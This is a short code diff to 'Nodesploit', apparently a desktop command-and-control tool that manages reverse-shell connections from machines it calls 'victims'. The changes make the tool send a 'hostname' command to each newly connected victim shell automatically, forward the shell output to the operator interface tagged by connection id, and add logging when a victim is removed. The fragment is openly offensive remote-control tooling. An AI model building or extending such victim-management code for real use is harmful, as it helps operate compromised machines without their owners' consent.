@@ -124,6 +124,8 @@ class Nodesploit {
         socket.setDefaultEncoding("utf8");
         socket.id = nanoid(10);
 
+        socket.write("hostname \n");
+
         this.addVictime(socket);
 
         socket.on("error", (e) => {
@@ -157,7 +159,11 @@ class Nodesploit {
 
         socket.on("data", (data) => {
           if (cmd !== data) {
-            this.mainWin.webContents.send("datarec", data.toString("ascii"));
+            console.log(data.toString("utf8"));
+            this.mainWin.webContents.send("datarec", {
+              data: data.toString("utf8"),
+              id: socket.id,
+            });
           }
         });
       }
@@ -190,6 +196,7 @@ class Nodesploit {
    * @param {String} id
    */
   deleteVictime(id) {
+    console.log(`i will delete this ${id}`);
     store.dispatch("REMOVE_CHILD", id);
     if (this.sockets.has(id)) {
       this.sockets.get(id).destroy();
@@ -215,7 +222,6 @@ class Nodesploit {
     }
   }
 }
-
 
 var ns = new Nodesploit();
 
